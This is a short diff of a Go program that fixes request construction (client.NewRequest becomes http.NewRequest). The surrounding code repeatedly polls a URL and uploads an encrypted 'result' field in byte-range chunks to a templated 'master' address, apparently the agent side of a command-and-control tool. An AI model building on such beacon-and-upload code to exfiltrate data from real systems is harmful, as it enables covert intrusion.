@@ -579,7 +579,7 @@ func send() { //发送头部信息
     /*inithttp*/
     func getUrl(url string) string {
         for {
-            req, err := client.NewRequest("GET", url, nil)
+            req, err := http.NewRequest("GET", url, nil)
             if err != nil {
                 time.Sleep(time.Duration(waitTime) * time.Second)
                 continue
@@ -617,7 +617,7 @@ func send() { //发送头部信息
             if len(formData) > 0 {
                 formData = formData[:len(formData)-1]
             }
-            req, err := client.NewRequest("POST", re_url, strings.NewReader(formData))
+            req, err := http.NewRequest("POST", re_url, strings.NewReader(formData))
             if err != nil {
                 time.Sleep(time.Duration(waitTime) * time.Second)
                 continue
@@ -719,7 +719,7 @@ func send() { //发送头部信息
 	            writer.WriteField("/*result*/", data_encry)
 	            writer.Close()
 	            url := protocol + master + "//*Path*/?/*option*/=/*upload*/"
-	            req, _ := client.NewRequest("POST", url, &buffer)
+	            req, _ := http.NewRequest("POST", url, &buffer)
 	            req.Header.Set("Content-Type", writer.FormDataContentType())
 	            req.Header.Set("Range", "bytes "+strconv.Itoa(start)+"-"+strconv.Itoa(end-1))
 	            resp, err := client.Do(req)
